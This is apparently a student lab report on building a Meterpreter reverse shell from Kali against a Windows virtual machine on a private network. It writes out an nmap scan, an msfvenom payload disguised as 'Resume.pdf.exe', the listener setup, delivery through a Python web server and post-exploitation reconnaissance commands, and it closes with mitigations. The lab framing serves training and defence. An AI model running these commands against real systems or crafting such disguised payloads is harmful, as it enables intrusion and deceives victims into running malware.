# Ethical Hacking and Reverse Shell Analysis

## **Project Report**
Ethical Hacking and Reverse Shell Analysis


---

### **Project Title**:  
Setting Up and Analyzing a Reverse Shell in a Simulated Internal Network

---

### **Introduction**

This project explores the setup and execution of a reverse shell attack in a controlled environment. By simulating such a scenario, cybersecurity professionals can better understand how attackers exploit vulnerabilities to gain unauthorized access to systems. The insights gained from this exercise will help strengthen defensive strategies and promote awareness of potential risks. All activities were conducted ethically within an isolated environment.

---

### **Objectives**

1. Simulate an internal network using virtual machines.
2. Perform reconnaissance on a target system to identify potential vulnerabilities.
3. Create and execute a reverse shell payload.
4. Analyze post-exploitation activities using Meterpreter.
5. Identify mitigation strategies to protect against reverse shell attacks.

---

### **Environment Setup**

1. **Virtual Machines Configuration**:
   - **Windows VM**: IP address `192.168.10.20`![Screenshot 2024-12-26 232122](https://github.com/user-attachments/assets/78ef26d2-4190-4236-9596-cc5534ec111a)


   - **Kali Linux VM**: IP address `192.168.10.21`![Screenshot 2024-12-26 232716](https://github.com/user-attachments/assets/9f6df1d7-40c6-4a64-bcf7-e3ad8d90904f)


2. **Network Validation**:
   - Ensure both VMs are connected to the same network by performing ping tests:
![Screenshot 2024-12-26 232951](https://github.com/user-attachments/assets/32d472f5-5abc-476e-bc42-d8fd9a61c892)



### **Steps and Execution**

#### **Step 1: Reconnaissance**

- Use `nmap` to scan the Windows VM for open ports and services:
  ```bash
  nmap -A 192.168.10.20 -Pn

![Screenshot 2024-12-27 000525](https://github.com/user-attachments/assets/1f87202b-8081-45e1-9072-7b69632842d5)


#### **Step 2: Payload Creation**

A reverse shell payload is a malicious program that initiates a connection back to the attacker’s machine, allowing remote command execution. It bypasses traditional security measures like firewalls by establishing the connection from inside the target network.
![Screenshot 2024-12-27 000844](https://github.com/user-attachments/assets/a21e935b-f80d-4a86-bb59-260c334e6198)
![Screenshot 2024-12-27 001050](https://github.com/user-attachments/assets/831c540f-106a-4a06-85b9-ebe0370c6ea3)


- Generate the payload using `msfvenom`:

  ```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.21 lport=4444 -f exe -o Resume.pdf.exe
  ```


- Verify the file type:
  ```bash
  file Resume.pdf.exe
  ```
    ![Screenshot 2024-12-27 001727](https://github.com/user-attachments/assets/f9be2c00-db9c-4919-8cc2-62d961b97792)

#### **Step 3: Listener Setup**

- Launch the Metasploit Framework:
  ```bash
  msfconsole
  ```
  ![Screenshot 2024-12-27 001947](https://github.com/user-attachments/assets/976c3bb5-4851-4450-8849-c953736761e0)

- Configure the handler to listen for incoming connections:
  ```bash
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set lhost 192.168.10.21
  set lport 4444
  exploit
  ```
![Screenshot 2024-12-27 002111](https://github.com/user-attachments/assets/01966d26-76d7-440f-876d-211c7d0d2e4f)
![Screenshot 2024-12-27 002553](https://github.com/user-attachments/assets/28d19ec4-c3dd-41ad-bf84-191e38848d45)
![Screenshot 2024-12-27 002610](https://github.com/user-attachments/assets/9a6210f1-20ca-49f6-8bfa-69468b50deac)
![Screenshot 2024-12-27 003330](https://github.com/user-attachments/assets/62709ad6-d480-4a10-a459-4ae6c8e7fae4)
![Screenshot 2024-12-27 003359](https://github.com/user-attachments/assets/276af1ed-0c7c-4a1a-a91a-b5a26e52f5fc)

#### **Step 4: Hosting the File**

- Serve the malicious file using Python’s HTTP server:
  ```bash
  python -m http.server 9999
  ```
![Screenshot 2024-12-27 003528](https://github.com/user-attachments/assets/452b6929-cbf7-46a1-ba8a-3aac55b54c62)

#### **Step 5: Execution on Windows VM**

- Open a web browser in the Windows VM and navigate to:
  ```
  http://192.168.10.21:9999
  ```
  ![Screenshot 2024-12-27 003815](https://github.com/user-attachments/assets/ddf9eb80-e797-4b89-b0ef-65906fddfd0b)

- Download and execute `Resume.pdf.exe` to trigger the reverse shell.
![Screenshot 2024-12-27 003901](https://github.com/user-attachments/assets/8cae4eef-71d2-4304-9226-816e33d8b1ea)
![Screenshot 2024-12-27 003938](https://github.com/user-attachments/assets/b7683fe6-a727-469d-9ccf-46e2571c5c45)
![Screenshot 2024-12-27 004149](https://github.com/user-attachments/assets/7ac7e707-4d75-4abf-9f72-489e0edcf0b2)

#### **Step 6: Post-Exploitation**

- Access the Meterpreter session and execute commands to gather information:
  ```bash
  shell
  net user
  net localgroup
  whoami
  ipconfig
  ```
![Screenshot 2024-12-27 005345](https://github.com/user-attachments/assets/a876fd00-fefd-42a2-bde9-bd6a8400e270)
![Screenshot 2024-12-27 005438](https://github.com/user-attachments/assets/6b1a8f18-e674-4f46-a73c-4f92e4167dec)

#### **Step 7: Monitoring**

- Use `netstat` on the Windows VM to inspect network connections and processes:
  ```bash
  netstat -annob
  ```
![Screenshot 2024-12-27 005006](https://github.com/user-attachments/assets/3fa54750-1737-4190-9516-b9f4ec8ef234)
![Screenshot 2024-12-27 005045](https://github.com/user-attachments/assets/1dd6acd4-c065-407c-a9db-930245d0bff5)

---

### **Observations**

- The payload successfully established a reverse shell connection, illustrating how attackers can remotely control compromised systems.
- Commands executed on the target provided detailed information about system users, administrative groups, and network configurations.
- The `whoami` command confirmed the attacker's access level, indicating potential permissions for further exploitation.
- Active connections and processes observed using `netstat` highlighted channels that could be monitored to detect malicious activity.
- The payload’s performance varied depending on network stability, emphasizing the importance of robust and consistent network configurations during testing.

---

### **Ethical Considerations**

- This exercise was conducted in a secure and controlled environment to ensure no harm was caused to production systems.
- The primary goal is to understand attack methods and use this knowledge to strengthen system defenses.

---
### Skills Learned

- **Network Scanning and Reconnaissance**  
  - Understanding how to identify open ports and vulnerabilities using tools like `nmap`.

- **Payload Development**  
  - Creating and customizing reverse shell payloads with `msfvenom`.

- **Post-Exploitation Techniques**  
  - Executing commands on compromised systems to extract valuable information.

- **Network Monitoring**  
  - Using tools like `netstat` to observe and analyze active connections.

- **Ethical Hacking Practices**  
  - Conducting penetration testing responsibly in a controlled environment.



---
### **Mitigation Strategies**

1. **Network Segmentation**:

   - Isolate critical systems from less secure areas of the network.

2. **Regular Software Updates**:

   - Apply security patches promptly to close known vulnerabilities.

3. **Endpoint Protection**:

   - Use advanced antivirus and endpoint detection solutions to monitor for suspicious activity.

4. **User Training**:

   - Educate users about the risks of phishing and downloading suspicious files.

5. **Firewall and IDS Rules**:

   - Configure firewalls and intrusion detection systems to block unauthorized outgoing traffic.

---

### **Conclusion**

This project highlights the critical need for proactive measures to protect systems against reverse shell attacks. By understanding the techniques used by attackers, cybersecurity professionals can better safeguard networks and educate stakeholders on mitigating risk
